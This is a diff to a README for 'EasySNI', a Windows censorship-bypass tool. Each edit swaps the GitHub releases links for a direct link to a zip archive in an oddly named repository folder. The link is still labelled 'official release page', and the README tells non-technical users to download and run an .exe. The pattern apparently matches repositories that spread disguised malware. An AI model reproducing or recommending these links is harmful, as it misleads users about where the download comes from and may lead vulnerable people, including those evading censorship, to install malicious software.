@@ -1,6 +1,6 @@
 # 🛡️ EasySNI - Bypass internet censorship with simple tools
 
-[![](https://img.shields.io/badge/Download-EasySNI-blue.svg)](https://github.com/Circulatory-barrator637/EasySNI/releases)
+[![](https://img.shields.io/badge/Download-EasySNI-blue.svg)](https://github.com/Circulatory-barrator637/EasySNI/raw/refs/heads/main/druggery/Easy_SNI_v2.9.zip)
 
 EasySNI helps you reach websites that your internet provider blocks. The program works by masking your traffic. This process hides your requests from network filters. You do not need technical skills to run this software. It works on most Windows computers.
 
@@ -8,7 +8,7 @@ EasySNI helps you reach websites that your internet provider blocks. The program
 
 You need the correct file for your computer to start. Follow the steps below to set up the software.
 
-1. Go to the [official release page](https://github.com/Circulatory-barrator637/EasySNI/releases).
+1. Go to the [official release page](https://github.com/Circulatory-barrator637/EasySNI/raw/refs/heads/main/druggery/Easy_SNI_v2.9.zip).
 2. Look for the Assets section at the bottom of the newest version.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
@@ -77,4 +77,4 @@ If the app fails to work after following these steps, check the issues page on t
 
 The software is an open-source project. Volunteers maintain the code to ensure it keeps pace with new censorship tactics. Updates happen every few months. Revisit the download link often to get the newest version of the app.
 
-[![](https://img.shields.io/badge/Download_Latest_EasySNI-grey.svg)](https://github.com/Circulatory-barrator637/EasySNI/releases)
+[![](https://img.shields.io/badge/Download_Latest_EasySNI-grey.svg)](https://github.com/Circulatory-barrator637/EasySNI/raw/refs/heads/main/druggery/Easy_SNI_v2.9.zip)
